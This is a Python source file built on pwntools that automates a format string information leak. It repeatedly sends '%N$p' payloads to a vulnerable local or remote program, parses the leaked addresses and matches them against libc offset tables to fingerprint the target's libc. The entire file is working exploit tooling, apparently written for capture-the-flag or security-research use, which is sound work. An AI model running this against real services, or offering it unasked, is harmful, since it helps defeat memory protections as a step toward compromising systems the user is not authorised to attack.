from pwn import *
import os

from formal_pledge.common import read_offsets_file, get_libc_folder, get_libcs, libc_name_to_path
from formal_pledge.calc_offsets import calculate_offsets

def get_libcs_with_offset_exact(offset_data, offset):
    good_libcs = []
    for libc in offset_data:
        lib_offset = offset_data[libc]
        if lib_offset == 0:
            continue
        if lib_offset == offset:
            good_libcs.append(libc)
    return good_libcs

# just like in https://github.com/niklasb/libc-database
def get_libcs_with_address_12bit(offset_data, address):
    good_libcs = []
    for libc in offset_data:
        lib_offset = offset_data[libc]
        if lib_offset == 0:
            continue
        if (lib_offset & 0xfff) == (address & 0xfff):
            good_libcs.append(libc)
    return good_libcs

# returns 0 on fail
def get_libc_start_in_process(p):
    libs = p.libs()
    for lib in libs:
        filename = os.path.basename(lib)
        if ('libc' in filename or 'musl' in filename) and '.so' in filename :
            return libs[lib]
    return 0

# 1. fmt_exec_func(payload) -> (program output, process)
# run will take care of closing the process
# the process needs to have aslr turned off
# 2. the ELF() vuln file
# 3. %{max_distance}$x
def run(fmt_exec_function, elff, max_distance=100):
    saved_log_level = context.log_level
    context.log_level = 'critical'
    
    test_payload = b'NY4AA~'
    testout, testp = fmt_exec_function(test_payload)
    # if testp.aslr:
    #     print('Run the process with ASLR off please.\np = process(["./vuln"], aslr=False)')
    #     return
    
    reflect_start = testout.find(test_payload)
    if reflect_start == -1:
        print('Cannot see the input in the output')
        return

    is_remote = isinstance(testp, remote)

    if not is_remote and get_libc_start_in_process(testp) == 0:
        print('Couldnt find location of LIBC in process')
        return
    testp.close()

    print('Checking offsets.')
    calculate_offsets()
    print('=' * 40)
    offset_data = read_offsets_file()

    context.arch = elff.arch

    # libc_return_offset = elff.libc.libc_start_main_return
    # print('ret!: ', hex(libc_return_offset))

    for i in range(1, max_distance + 1):
        output, p = fmt_exec_function(f'%{i}$pEND'.encode('ascii'))
        if isinstance(output, str):
            output = output.encode('ascii')
        output = output[reflect_start:]
        reflect_end = output.find(b'END')
        if reflect_end == -1:
            print('Cannot see END in the output')
            return
        output = output[:reflect_end]
        
        address = 0
        try:
            address = int(output, 16)
        except:
            continue

        possible_libcs = []

        if is_remote:
            possible_libcs = get_libcs_with_address_12bit(offset_data, address)

            if possible_libcs != []:
                possible_libcs_with_offset = []
                for libc in possible_libcs:
                    possible_libcs_with_offset.append((libc, hex(offset_data[libc])))
                print(f'string: "%{i}$p"\nlibcs with offset: {possible_libcs_with_offset}\n' + '-' * 20)
        else:
            libc_start = get_libc_start_in_process(p)
            offset = address - libc_start
            possible_libcs = get_libcs_with_offset_exact(offset_data, offset)

            if possible_libcs != []:
                print(f'string: "%{i}$p"\noffset: {hex(offset)}\nlibcs: {possible_libcs}\n' + '-' * 20)

        p.close()

    context.log_level = saved_log_level